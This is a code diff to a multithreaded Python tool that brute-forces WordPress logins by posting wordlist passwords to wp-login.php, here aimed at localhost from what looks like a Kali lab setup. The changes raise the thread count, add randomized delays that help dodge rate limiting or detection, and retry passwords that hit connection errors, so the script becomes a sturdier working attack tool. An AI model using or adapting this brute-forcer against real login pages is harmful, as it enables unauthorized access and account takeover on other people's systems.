@@ -5,10 +5,12 @@ from io import BytesIO
 import threading
 import requests
 import time
+import random
 
 WORDLIST = '/home/kali/repos/SecLists/Passwords/Software/cain-and-abel.txt'
 TARGET = 'http://localhost/wp-login.php'
 SUCCESS = "Welcome to WordPress!"
+THREADS = 9
 
 def get_words():
 	with open(WORDLIST) as f:
@@ -36,11 +38,11 @@ class Bruter:
 		self.username = username
 		self.url = url
 		self.found = False
-		print(f'\nBrute Force Attack beginning on {url}.\n')
-		print("Finished the setup where username = %s\n" % username)
+		print(f'Brute Force Attack beginning on {url}.')
+		print("Set up with username = %s." % username)
 
 	def run_bruteforce(self, passwords):
-		for _ in range(2):
+		for _ in range(THREADS):
 			t = threading.Thread(target=self.web_bruter, args=(passwords,))
 			t.start()
 
@@ -51,18 +53,24 @@ class Bruter:
 		params['log'] = self.username
 
 		while not passwords.empty() and not self.found:
-			time.sleep(5)
+			time.sleep(random.uniform(2.99, 8.22))
 			passwd = passwords.get()
-			print(f'Trying username/password {self.username}/{passwd:<10}')
+			print(f'Trying username:password {self.username}:{passwd:<10}')
 			params['pwd'] = passwd
 
-			resp1 = session.post(self.url, data=params)
-			if SUCCESS in resp1.content.decode():
-				self.found = True
-				print(f'\nBruteforcing successful.')
-				print("Username is %s" % self.username)
-				print("Password is %s\n" % passwd)
-				print('done: now cleaning up other threads.')
+			try:
+				resp1 = session.post(self.url, data=params)
+
+				if SUCCESS in resp1.content.decode():
+					self.found = True
+					print(f'\nBruteforcing successful.')
+					print("Username is %s" % self.username)
+					print("Password is %s\n" % passwd)
+					print('done: now cleaning up other threads.')
+			except requests.exceptions.ConnectionError:
+				print(f'Connection problem, putting {passwd} back in the queue.')
+				passwords.put(passwd)
+
 
 if __name__ == '__main__':
 	words = get_words()
